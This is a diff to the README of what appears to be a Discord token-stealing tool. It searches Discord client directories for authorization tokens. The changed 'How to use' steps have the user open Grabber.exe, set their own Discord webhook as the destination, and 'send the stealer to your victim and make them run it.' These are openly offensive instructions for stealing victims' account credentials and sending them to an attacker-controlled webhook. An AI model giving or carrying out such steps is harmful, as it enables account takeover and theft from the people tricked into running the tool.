@@ -9,6 +9,7 @@ Searches for authorization tokens in multiple directories (Discord, Discord PTB,
 
 
 How to use
-Create a webhook on your Discord server. I recommend creating a new server.
-Change the 'WEBHOOK_URL' variable value to your Discord webhook URL.
-Send the script to your victim and make them run it.
+Open Grabber.exe
+Create a webhook on your Discord server.
+Change the sample webhook to your Discord webhook URL.
+Send the stealer to your victim and make them run it.
